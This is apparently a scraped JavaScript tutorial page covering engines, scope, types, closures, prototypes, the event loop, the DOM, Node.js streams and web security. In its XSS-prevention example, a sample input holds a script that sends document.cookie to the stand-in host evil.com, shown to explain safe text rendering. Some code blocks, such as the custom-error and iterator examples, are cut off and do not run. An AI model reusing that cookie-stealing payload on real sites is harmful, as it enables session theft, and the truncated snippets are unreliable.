Chapter 01

History, Engines & Strict Mode

Discover the historical context of JavaScript, how engines compile and execute code under the hood, and how to write cleaner code using strict mode.

1.1 The History and Evolution of JavaScript

JavaScript was created in September 1995 by Brendan Eich while working at Netscape Communications. Initially named Mocha, it was renamed to LiveScript, and quickly changed to JavaScript to ride the popularity of Sun Microsystems' Java. In 1997, it was standardized by ECMA International under the specification name ECMAScript.

The release of ES6 (ECMAScript 2015) was a watershed moment, introducing modern syntax such as classes, block scoping, modules, arrow functions, and promises, transforming JavaScript from a basic browser scripting tool into an enterprise-grade programming language.

1.2 How JavaScript Engines Work

A JavaScript Engine executes JavaScript code. The most famous engine is Google's V8 (used in Chrome, Node.js, and Opera). Other major engines include Mozilla's SpiderMonkey (Firefox) and Apple's JavaScriptCore (Safari).

Unlike traditional compiled languages, JavaScript is executed using a process called Just-In-Time (JIT) Compilation:

  1. Parser: Reads the raw code and generates a structure called the AST (Abstract Syntax Tree).
  2. Interpreter (Ignition in V8): Converts the AST into intermediate Bytecode. This starts executing the code immediately without waiting for compilation.
  3. Compiler (TurboFan in V8): Analyzes the running code (profiling). When it detects a function is run frequently ("hot code"), it compiles it directly into highly optimized machine code.
jit-compilation-flow.js
// JIT optimization demonstration
function add(a, b) {
  return a + b;
}

// At first, V8 executes "add" using the Ignition interpreter.
// If "add" is called thousands of times with numbers, TurboFan compiles
// it directly to machine instructions optimized for integer addition.
for (let i = 0; i < 100000; i++) {
  add(i, 1);
}

// Deoptimization trigger: if we suddenly pass strings, the compiled machine code
// must "bail out" back to the interpreter because the type assumption failed.
add("hello", "world");

1.3 Strict Mode

Strict Mode was introduced in ES5 to opt-in to a restricted variant of JavaScript. It enforces cleaner code, catches silent errors, and prevents features that are poorly designed.

To enable strict mode, add the literal string "use strict"; to the top of your script file or the top of a specific function.

strict-mode.js
"use strict";

// 1. Prevents accidental globals
// x = 10; // ReferenceError: x is not defined

// 2. Prevents duplicate parameter names
// function duplicate(a, a) {} // SyntaxError: Duplicate parameter name not allowed

// 3. Prevents deleting non-deletable properties
// delete Object.prototype; // TypeError: Cannot delete property

// 4. "this" in function calls is undefined instead of window/global
function showThis() {
  console.log(this);
}
showThis();
undefined
Chapter 02

Variables, Scope & Memory

Learn about the differences between let, const, and var, variable hoisting, the Scope Chain, and how JavaScript manages memory heap allocation.

2.1 Scope: Global, Function, and Block

Scope refers to the accessibility of variables. JavaScript has three types of scope:

  • Global Scope: Variables declared outside any function or block can be accessed from anywhere.
  • Function Scope: Variables declared with var inside a function are local to that function.
  • Block Scope: Variables declared with let or const inside a block {} cannot be accessed outside it.
scope-demonstration.js
let globalVal = "Global";

function scopeDemo() {
  var funcScoped = "Function Scoped";
  
  if (true) {
    let blockScoped = "Block Scoped";
    var leakyVar = "Leaky Var";
    console.log(blockScoped); // Accessible
  }
  
  console.log(leakyVar);    // Accessible because var ignores blocks
  // console.log(blockScoped); // ReferenceError: blockScoped is not defined
}
scopeDemo();

2.2 Hoisting and the Temporal Dead Zone (TDZ)

Hoisting is JavaScript's default behavior of moving declarations to the top of the current scope before execution. Variables declared with var are hoisted and initialized with undefined. Variables declared with let and const are hoisted but not initialized, placing them in the Temporal Dead Zone (TDZ) until execution reaches their declaration.

hoisting-tdz.js
console.log(hoistedVar); // undefined
var hoistedVar = 42;

// Temporal Dead Zone (TDZ) starts here
// console.log(tdzVar); // ReferenceError: Cannot access 'tdzVar' before initialization
let tdzVar = 100; // TDZ ends here
console.log(tdzVar); // 100

2.3 Memory Management and Garbage Collection

JavaScript automatically allocates memory when values are created and frees it when they are no longer used through a process called Garbage Collection. The main algorithm used by modern engines is Mark-and-Sweep. It starts from global roots and marks all reachable objects. Any objects that are not marked are swept from memory.

⚠
Memory Leaks occur when variables remain referenced but are no longer needed. Common causes: forgotten timers (using setInterval), global variables, and closures holding large scopes.

Primitive & Reference Types

Understand memory stack vs heap differences, detailed analysis of JavaScript primitives, dynamic object property descriptors, and implicit coercion behavior.

3.1 Primitives vs References

JavaScript classifies data into two categories: Primitives and Reference Types (Objects).

FeaturePrimitive TypesReference Types
LocationStored directly in the Stack.Stored in the Heap, Stack holds the reference address.
MutabilityImmutable (cannot change the value itself).Mutable (properties can change).
ComparisonCompared by Value.Compared by Reference (identity).
stack-heap.js
// Primitive: compared by value
let num1 = 10;
let num2 = 10;
console.log(num1 === num2); // true

// Reference: compared by heap address reference
let obj1 = { val: 10 };
let obj2 = { val: 10 };
console.log(obj1 === obj2); // false

let obj3 = obj1;
console.log(obj1 === obj3); // true

3.2 Float Precision Issues (IEEE-754)

All numbers in JavaScript are represented as double-precision floating-point numbers conforming to the IEEE-754 standard. Because computers use binary fractions, some base-10 fractions (like 0.1 and 0.2) cannot be represented exactly, leading to floating-point errors.

float-precision.js
console.log(0.1 + 0.2); // 0.30000000000000004
console.log(0.1 + 0.2 === 0.3); // false

// Safe way to compare float numbers: Number.EPSILON
const areEqual = (a, b) => Math.abs(a - b) < Number.EPSILON;
console.log(areEqual(0.1 + 0.2, 0.3)); // true

3.3 Object Property Descriptors

Properties in JavaScript have attributes that control how they behave. You can define them using Object.defineProperty().

property-descriptors.js
const user = {};

Object.defineProperty(user, "id", {
  value: 1001,
  writable: false,     // Value cannot be changed
  enumerable: true,    // Shows up in loop and Object.keys()
  configurable: false  // Property cannot be deleted or re-configured
});

// user.id = 2000; // Will throw error in strict mode
// delete user.id;  // Will fail
console.log(user.id);

3.4 Map, WeakMap, Set, and WeakSet

Modern JavaScript provides optimized structures for working with key-value pairs and unique collections:

  • Map: Allows keys of any data type. Preserves insertion order.
  • WeakMap: Keys must be objects. Holds weak references to keys, allowing automatic garbage collection if the key object has no other references.
  • Set: A collection of unique values.
  • WeakSet: A WeakSet contains only objects, and holds weak references to them.
weakmaps.js
let meta = new WeakMap();
let userObj = { name: "Sathisha" };

meta.set(userObj, "Admin Privileges");

// If userObj is set to null, the entry in the WeakMap will be automatically garbage collected
userObj = null;
Chapter 04

Operators & Expressions

Master unary, binary, logical, and bitwise operators along with dynamic evaluation rules and operator precedence logic.

4.1 Bitwise Operators

Bitwise operators treat their operands as a sequence of 32 bits (zeros and ones) and perform operations at the binary level.

bitwise-ops.js
const A = 5;  // Binary: 0101
const B = 3;  // Binary: 0011

console.log(A & B);   // Bitwise AND: 0001 (1)
console.log(A | B);   // Bitwise OR:  0111 (7)
console.log(A ^ B);   // Bitwise XOR: 0110 (6)
console.log(A << 1);  // Left Shift:  1010 (10)

4.2 Nullish Coalescing vs Logical OR

The Nullish Coalescing operator (??) returns its right-hand operand only if the left-hand operand is null or undefined. The Logical OR operator (||) returns its right-hand operand for any falsy value (such as 0, false, or "").

nullish.js
const score = 0;

const val1 = score || 100; // Returns 100 because 0 is falsy
const val2 = score ?? 100; // Returns 0 because 0 is not nullish

console.log(val1, val2);
100 0

5.2 Custom Exception Handling

You can throw custom errors by extending the built-in Error class. Using the cause property helps track nested root cause exceptions.

custom-errors.js
class DatabaseError extends Error {
  constructor(message, options) {
    super(message, options);
    this.name = "DatabaseError";
  }
}

try {
  try {
    throw new Error("Connection Timeout");
  } catch (err) {
    throw new DatabaseError("Failed to retrieve data", { cause: err });

  console.log(dbErr.message);
  console.log("Root Cause:", dbErr.cause.message);

Chapter 06

Functions, Scope & Closures

Master function execution contexts, arrow functions, lexical scope environments, currying, and the execution bindings of the "this" keyword.

6.1 Closures and Lexical Environments

A closure is a function that retains access to its lexical scope environment, even when that function is executed outside its original scope. This enables data encapsulation and private variables.

closure-mechanics.js
function createBankAccount(owner, initialBalance) {
  let balance = initialBalance; // Private variable
  
  return {
    deposit(amount) {
      balance += amount;
      return balance;
    },
    withdraw(amount) {
      if (amount > balance) return "Insufficient funds";
      balance -= amount;
      return balance;
    },
    getBalance() {
      return balance;
    }
  };
}

const account = createBankAccount("Alice", 1000);
account.deposit(500);
console.log(account.getBalance()); // 1500
console.log(account.balance);      // undefined (isolated scope)

6.2 Currying and Higher-Order Functions

Currying translates a function that takes multiple arguments into a sequence of functions, each taking a single argument.

currying.js
// Non-curried function
const log = (date, type, message) => "[" + date + "] [" + type + "] " + message;

// Curried function
const curriedLog = date => type => message => "[" + date + "] [" + type + "] " + message;

const logToday = curriedLog("2026-07-16");
const logTodayError = logToday("ERROR");

console.log(logTodayError("Database connection failed"));
[2026-07-16] [ERROR] Database connection failed

6.3 Explicit "this" Binding

You can explicitly bind the value of this using call, apply, or bind.

explicit-binding.js
function showDetails(city, country) {
  return this.name + " lives in " + city + ", " + country;
}

const person = { name: "Bob" };

// 1. Call: Invokes the function immediately with arguments passed individually
console.log(showDetails.call(person, "Bangalore", "India"));

// 2. Apply: Invokes the function immediately with arguments passed as an array
console.log(showDetails.apply(person, ["San Jose", "USA"]));

// 3. Bind: Returns a new function with "this" permanently bound
const boundFunc = showDetails.bind(person, "London");
console.log(boundFunc("UK"));
Chapter 07

OOP & Prototypal Inheritance

Explore JavaScript's prototype chain, class syntax, private attributes, accessor properties, and structural freeze methods.

7.1 The Prototype Chain

JavaScript uses prototypal inheritance. Every object has an internal link (historically referenced as __proto__) pointing to another prototype object. When accessing a property, the runtime travels up this chain until the property is found or the chain ends at Object.prototype.

prototypal-chain.js
const vehicle = {
  engine: true,
  start() { return "Vroom"; }
};

const car = Object.create(vehicle);
car.wheels = 4;

// Inherits start() method from vehicle
console.log(car.start());
console.log(Object.getPrototypeOf(car) === vehicle); // true

7.2 ES6 Classes & Private Fields

ES6 classes provide a cleaner syntax to write prototypal inheritance. In ES2022, private properties and methods can be declared using the # prefix.

class-es6.js
class Person {
  #socialSecurityNumber; // Private field

  constructor(name, ssn) {
    this.name = name;
    this.#socialSecurityNumber = ssn;
  }

  getSSN() {
    return this.#socialSecurityNumber;
  }
}

const john = new Person("John Doe", "123-45-6789");
console.log(john.name);
console.log(john.getSSN());

7.3 Restricting Mutations: Freeze vs Seal

JavaScript provides methods to restrict changes to objects:

  • Object.preventExtensions(obj): Stops new properties from being added.
  • Object.seal(obj): Stops adding/deleting properties. Existing properties can still be modified.
  • Object.freeze(obj): Stops adding, deleting, or modifying properties. The object becomes read-only.

8.1 Common Array Methods

Modern JavaScript has powerful methods for manipulating arrays:

  • map(): Transforms every element and returns a new array.
  • filter(): Returns a new array containing elements that pass a test.
  • reduce(): Runs a reducer function on each element, returning a single value.
  • flat() & flatMap(): Flattens nested arrays.

8.2 Iterator Protocol

An object is an iterable if it implements the [Symbol.iterator] method, which returns an object containing a next() method.

custom-iterator.js
const rangeObj = {
  start: 1,
  end: 3,
  [Symbol.iterator]() {
    let current = this.start;
    let last = this.end;
    return {
      next() {
        if (current <= last) {
          return { value: current++, done: false };
        }
        return { done: true };
      }
    };
  }
};

for (const v of rangeObj) {
  console.log(v);

Chapter 09

Async JS & The Event Loop

Learn about the Event Loop phases, microtasks vs macrotasks, Promise APIs, and clean async/await code structures.

9.1 The Event Loop Architecture

JavaScript is a single-threaded language. To handle asynchronous code without blocking execution, the engine uses the Event Loop. When asynchronous APIs finish (like setTimeout or fetch), they place their callbacks into one of two queues:

  • Microtask Queue: Holds Promise callbacks, queueMicrotask, and MutationObservers. This queue has priority and is completely emptied before the engine continues.
  • Macrotask Queue: Holds callbacks for events like timers (setTimeout), I/O operations, and user interaction events.

9.2 Promise Combinators

APIBehavior
Promise.all()Waits for all promises to resolve. Rejects immediately if any promise fails.
Promise.allSettled()Waits for all promises to complete (resolved or rejected). Never rejects.
Promise.race()Returns the result of the first promise that settles (resolved or rejected).
Promise.any()Returns the value of the first promise that resolves. Rejects only if all promises fail.
promise-combinators.js
const delay = (ms, val, shouldReject = false) => 
  new Promise((resolve, reject) => 
    setTimeout(() => shouldReject ? reject("Error") : resolve(val), ms)
  );

Promise.allSettled([
  delay(100, "Resolved Val"),
  delay(200, "", true)
]).then(results => console.log(results));

Chapter 11

Browser, Web APIs & DOM

Learn how browsers render pages, capture and bubble events, handle DOM changes, and manage web storage APIs.

11.1 DOM Performance: Reflows and Repaints

Manipulating the DOM can be expensive because it can trigger page recalculations:

  • Reflow: Occurs when the layout, size, or position of elements changes. This forces the browser to recalculate the page layout.
  • Repaint: Occurs when visual styles change (like background color or visibility) without affecting the layout.
💡
To minimize reflows, make changes to an offscreen DOM node or a DocumentFragment before adding it back to the active page DOM.

11.2 Event Bubbling and Capturing

Events propagate through the DOM in three phases:

  1. Capture Phase: The event travels down from the global window node to the target element.
  2. Target Phase: The event fires on the target element.
  3. Bubble Phase: The event bubbles back up from the target element to the window.
event-delegation.js
// Event delegation pattern
const parentContainer = document.getElementById("menu");

parentContainer.addEventListener("click", (event) => {
  // Delegate listener to handle button clicks
  if (event.target.tagName === "BUTTON") {
    console.log("Button clicked ID:", event.target.dataset.id);
  }
});

Node.js Architecture & Backend

Explore the Node.js runtime, how libuv provides non-blocking I/O, core modules, streams, and event handlers.

12.1 Node.js Architecture (V8 & Libuv)

Node.js is a runtime environment that runs JavaScript code outside the browser. It uses the V8 engine to execute code, and a library called libuv to handle asynchronous, non-blocking I/O operations.

Libuv manages the system Event Loop and provides a Thread Pool to run heavy tasks (like file system operations or cryptography) in the background, keeping the main JavaScript execution thread free.

12.2 Working with Streams

Streams allow you to process data in chunks piece-by-piece, without loading the entire file into memory. This is highly efficient for handling large files or network responses.

// Read a file in chunks using a readable stream
const readStream = fs.createReadStream("large-dataset.csv", { encoding: "utf8" });

readStream.on("data", (chunk) => {
  console.log("Received chunk of data...");
  // Process chunk
});
Chapter 13

Tooling, Optimization & Security

Learn how to optimize performance with debouncing and throttling, configure modern build tools, and protect against security vulnerabilities.

13.1 Performance: Debounce vs Throttle

These techniques limit how often a function can run over time:

  • Debounce: Delays execution until a specified time has passed since the last call. Ideal for autocomplete search inputs.
  • Throttle: Limits execution to once within a specified time window. Ideal for window scroll or resize event handlers.
debounce-throttle.js
// Debounce implementation
function debounce(func, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => func.apply(this, args), delay);
  };
}

// Throttle implementation
function throttle(func, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      func.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

13.2 Security Vulnerabilities (XSS & CSRF)

Security is critical when building web applications:

  • Cross-Site Scripting (XSS): Occurs when an attacker injects malicious scripts into your site. To prevent this, always sanitize user input and use element.textContent instead of element.innerHTML.
  • Cross-Site Request Forgery (CSRF): Occurs when a malicious site tricks a user's browser into making unauthorized requests to your site. To prevent this, use anti-CSRF tokens and configure SameSite cookie attributes.
xss-prevention.js
const userInput = "<script>fetch('evil.com/steal?cookie=' + document.cookie)</script>";

// VULNERABLE to XSS
// div.innerHTML = userInput;

// SAFE from XSS
const div = document.createElement("div");
div.textContent = userInput; // Browser renders this as plain text, script does not execute

13.3 Design Patterns & Best Practices

Critical Production Rules

  • Strict Equality: Always use === instead of == to avoid unexpected type coercion.
  • Variable Bindings: Use const by default, let when a variable needs to be reassigned, and avoid using var.
  • Error Handling: Never leave a catch block empty. Always handle errors or log them to an error tracking service.
  • Performance: Avoid memory leaks by cleaning up event listeners and clearing intervals/timeouts when components are unmounted.
